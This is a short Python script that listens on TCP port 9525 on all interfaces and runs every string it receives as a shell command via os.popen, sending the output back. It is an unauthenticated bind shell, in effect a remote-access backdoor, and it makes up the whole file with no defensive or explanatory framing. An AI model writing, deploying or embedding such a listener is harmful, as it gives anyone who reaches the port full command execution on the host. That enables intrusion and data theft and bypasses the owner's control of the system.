import socket
import os
PORT=9525
def command_server(port=PORT):
    s = socket.socket()
    s.bind(('', port))
    s.listen(1)
    print(f"Listening for commands on port {port}...")
    conn, addr = s.accept()
    print(f"Connection from {addr}")
    while True:
        cmd = conn.recv(1024).decode()
        if not cmd or cmd.strip().lower() == 'exit':
            break
        print(f"Received command: {cmd}")
        try:
            # Use os.popen to run the command and capture output
            with os.popen(cmd) as stream:
                output = stream.read()
            if not output:
                output = "[No output]"
        except Exception as e:
            output = f"Error: {e}"
        print(f"Sending response: {output[:100]}...")  # Log first 100 chars
        conn.sendall(output.encode())
    conn.close()
    print("Connection closed.")

if __name__ == "__main__":
    command_server()